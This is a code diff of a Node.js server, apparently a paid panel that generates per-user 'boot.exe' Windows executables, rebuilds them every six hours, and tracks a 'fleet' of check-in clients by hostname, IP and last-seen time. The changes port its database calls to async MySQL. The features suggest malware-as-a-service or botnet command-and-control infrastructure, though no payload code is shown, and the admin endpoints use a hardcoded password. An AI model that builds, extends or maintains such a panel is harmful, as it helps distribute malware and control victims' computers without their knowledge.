   fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.exe'), zipBuf, { mode: 0o644 });
 
   res.json({
     ok: true,
-    buildId: Number(info.lastInsertRowid),
+    buildId: Number(info.insertId),
     name: outName,
     size: zipBuf.length,
     key: buildKey,
-    url: `/api/builds/${info.lastInsertRowid}/download`,
+    url: `/api/builds/${info.insertId}/download`,
     liveUrl: '/api/downloads/boot.exe',
   });
 });
 
-app.get('/api/builds', requireAuth, (req, res) => {
-  const rows = db.prepare(sql`
-    SELECT id, name, size, base, key, created_at FROM builds
+app.get('/api/builds', requireAuth, async (req, res) => {
+  const [rows] = await db.query(`
+    SELECT id, name, size, base, \`key\`, created_at FROM builds
     WHERE user_id = ? ORDER BY created_at DESC LIMIT 100
-  `).all(req.user.uid);
+  `, [req.user.uid]);
   res.json(rows);
 });
 
-app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
+app.get('/api/builds/:id/download', limitDownload, requireAuth, async (req, res) => {
   const id = Number(req.params.id);
   if (!Number.isFinite(id)) return res.status(404).json({ error: 'not found' });
-  const row = db.prepare(sql`
+  const [rows] = await db.query(`
     SELECT name, stored_name, size FROM builds WHERE id = ? AND user_id = ?
-  `).get(id, req.user.uid);
-  if (!row) return res.status(404).json({ error: 'not found' });
+  `, [id, req.user.uid]);
+  if (!rows.length) return res.status(404).json({ error: 'not found' });
+  const row = rows[0];
   const src = path.join(BUILD_DIR, row.stored_name);
   if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
   res.setHeader('Content-Type', 'application/x-msdownload');
@@ -915,18 +929,16 @@ app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
   fs.createReadStream(src).pipe(res);
 });
 
-app.delete('/api/builds/:id', requireAuth, (req, res) => {
+app.delete('/api/builds/:id', requireAuth, async (req, res) => {
   const id = Number(req.params.id);
   if (!Number.isFinite(id)) return res.status(404).json({ error: 'not found' });
-  const row = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ? AND user_id = ?`).get(id, req.user.uid);
-  if (!row) return res.status(404).json({ error: 'not found' });
-  const p = path.join(BUILD_DIR, row.stored_name);
+  const [rows] = await db.query(`SELECT stored_name FROM builds WHERE id = ? AND user_id = ?`, [id, req.user.uid]);
+  if (!rows.length) return res.status(404).json({ error: 'not found' });
+  const p = path.join(BUILD_DIR, rows[0].stored_name);
   try { fs.unlinkSync(p); } catch {}
-  db.prepare(sql`DELETE FROM builds WHERE id = ? AND user_id = ?`).run(id, req.user.uid);
+  await db.query(`DELETE FROM builds WHERE id = ? AND user_id = ?`, [id, req.user.uid]);
   res.json({ ok: true });
 });
-
-// ---------- admin ----------
 
 app.post('/api/admin/login', limitAdmin, (req, res) => {
   const { password } = req.body || {};
@@ -934,39 +946,38 @@ app.post('/api/admin/login', limitAdmin, (req, res) => {
   res.status(403).json({ error: 'Forbidden' });
 });
 
-app.post('/api/admin/upgrade', limitAdmin, (req, res) => {
+app.post('/api/admin/upgrade', limitAdmin, async (req, res) => {
   const { password, accountKey, days } = req.body || {};
 
   if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
   if (!accountKey) return res.status(400).json({ error: 'Account key required' });
   if (!days || isNaN(days)) return res.status(400).json({ error: 'Valid days required' });
 
-  const user = db.prepare(sql`SELECT id, premium_until FROM users WHERE account_key = ?`).get(accountKey);
-  if (!user) return res.status(404).json({ error: 'User not found' });
+  const [users] = await db.query(`SELECT id, premium_until FROM users WHERE account_key = ?`, [accountKey]);
+  if (!users.length) return res.status(404).json({ error: 'User not found' });
+  const user = users[0];
 
-  const baseTime = (user.premium_until && user.premium_until > Date.now()) ? user.premium_until : Date.now();
+  const baseTime = (user.premium_until && Number(user.premium_until) > Date.now()) ? Number(user.premium_until) : Date.now();
   const newExpiry = baseTime + (Number(days) * 24 * 60 * 60 * 1000);
 
-  db.prepare(sql`UPDATE users SET premium_until = ? WHERE id = ?`).run(newExpiry, user.id);
+  await db.query(`UPDATE users SET premium_until = ? WHERE id = ?`, [newExpiry, user.id]);
 
   const dateStr = new Date(newExpiry).toLocaleString();
   res.json({ ok: true, message: `Premium active until ${dateStr}` });
 });
 
-app.post('/api/admin/remove', limitAdmin, (req, res) => {
+app.post('/api/admin/remove', limitAdmin, async (req, res) => {
   const { password, accountKey } = req.body || {};
 
   if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
   if (!accountKey) return res.status(400).json({ error: 'Account key required' });
 
-  const user = db.prepare(sql`SELECT id FROM users WHERE account_key = ?`).get(accountKey);
-  if (!user) return res.status(404).json({ error: 'User not found' });
+  const [users] = await db.query(`SELECT id FROM users WHERE account_key = ?`, [accountKey]);
+  if (!users.length) return res.status(404).json({ error: 'User not found' });
 
-  db.prepare(sql`UPDATE users SET premium_until = 0 WHERE id = ?`).run(user.id);
+  await db.query(`UPDATE users SET premium_until = 0 WHERE id = ?`, [users[0].id]);
   res.json({ ok: true, message: 'Premium removed successfully' });
 });
-
-// ---------- admin2 — global fleet stats ----------
 
 const ADMIN2_PASSWORD = process.env.ADMIN2_PASSWORD || 'Shit123';
 const ADMIN2_COOKIE   = 'a2_token';
@@ -1025,28 +1036,28 @@ app.get('/api/admin2/me', limitAdmin2Api, requireAdmin2, (req, res) => {
   res.json({ ok: true });
 });
 
-app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, (req, res) => {
+app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, async (req, res) => {
   res.setHeader('Cache-Control', 'no-store');
 
   const now = Date.now();
   const cutoff = now - 30_000;
 
-  const totalRow   = db.prepare(`SELECT COUNT(*) AS n FROM clients`).get();
-  const onlineRow  = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen >= ?`).get(cutoff);
-  const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE last_seen <  ?`).get(cutoff);
+  const [totalRows]   = await db.query(`SELECT COUNT(*) AS n FROM clients`);
+  const [onlineRows]  = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE last_seen >= ?`, [cutoff]);
+  const [offlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE last_seen <  ?`, [cutoff]);
 
-  const rows = db.prepare(`
+  const [rows] = await db.query(`
     SELECT c.id, c.hostname, c.ip, c.last_seen, u.username
     FROM clients c
     JOIN users u ON u.id = c.user_id
     ORDER BY c.last_seen DESC
     LIMIT 500
-  `).all();
+  `);
 
   res.json({
-    total:   Number(totalRow.n),
-    online:  Number(onlineRow.n),
-    offline: Number(offlineRow.n),
+    total:   Number(totalRows[0].n),
+    online:  Number(onlineRows[0].n),
+    offline: Number(offlineRows[0].n),
     rows: rows.map(r => ({
       id: r.id,
       hostname: r.hostname,
@@ -1062,12 +1073,12 @@ app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, (req, res) => {
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
-// ---------- auto-refresh every 6h ----------
 const AUTO_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
 
 async function refreshAllBuilds() {
   try {
-    const userIds = db.prepare(sql`SELECT DISTINCT user_id FROM builds WHERE base = 'boot'`).all().map(r => r.user_id);
+    const [rows] = await db.query(`SELECT DISTINCT user_id FROM builds WHERE base = 'boot'`);
+    const userIds = rows.map(r => r.user_id);
     if (userIds.length === 0) {
       console.log('[auto-refresh] no builds to refresh');
       return;
@@ -1077,12 +1088,14 @@ async function refreshAllBuilds() {
 
     for (const uid of userIds) {
       try {
-        const u = db.prepare(sql`SELECT account_key FROM users WHERE id = ?`).get(uid);
+        const [uRows] = await db.query(`SELECT account_key FROM users WHERE id = ?`, [uid]);
+        const u = uRows[0];
         if (!u || !u.account_key) continue;
 
-        const latest = db.prepare(sql`
-          SELECT id, key FROM builds WHERE user_id = ? AND base = 'boot' ORDER BY created_at DESC LIMIT 1
-        `).get(uid);
+        const [latestRows] = await db.query(`
+          SELECT id, \`key\` FROM builds WHERE user_id = ? AND base = 'boot' ORDER BY created_at DESC LIMIT 1
+        `, [uid]);
+        const latest = latestRows[0];
         if (!latest) continue;
 
         console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
@@ -1091,22 +1104,24 @@ async function refreshAllBuilds() {
         const exeName = `build_${Date.now()}_u${uid}.exe`;
         fs.writeFileSync(path.join(BUILD_DIR, exeName), exeBuf, { mode: 0o644 });
 
-        const old = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ?`).get(latest.id);
+        const [oldRows] = await db.query(`SELECT stored_name FROM builds WHERE id = ?`, [latest.id]);
+        const old = oldRows[0];
 
-        db.prepare(sql`
+        await db.query(`
           UPDATE builds SET name = ?, stored_name = ?, size = ?, created_at = ? WHERE id = ?
-        `).run(exeName, exeName, exeBuf.length, Date.now(), latest.id);
+        `, [exeName, exeName, exeBuf.length, Date.now(), latest.id]);
 
         if (old && old.stored_name && old.stored_name !== exeName) {
           try { fs.unlinkSync(path.join(BUILD_DIR, old.stored_name)); } catch {}
         }
 
-        const stale = db.prepare(sql`
+        const [staleRows] = await db.query(`
           SELECT id, stored_name FROM builds WHERE user_id = ? AND id != ? AND base = 'boot'
-        `).all(uid, latest.id);
-        for (const b of stale) {
+        `, [uid, latest.id]);
+        
+        for (const b of staleRows) {
           try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
-          db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
+          await db.query(`DELETE FROM builds WHERE id = ?`, [b.id]);
         }
 
         if (!liveExeWritten) {
@@ -1126,8 +1141,6 @@ async function refreshAllBuilds() {
 
 setInterval(refreshAllBuilds, AUTO_REFRESH_INTERVAL_MS);
 setTimeout(refreshAllBuilds, 10_000);
-
-// ---------- udp / http / https boot ----------
 
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
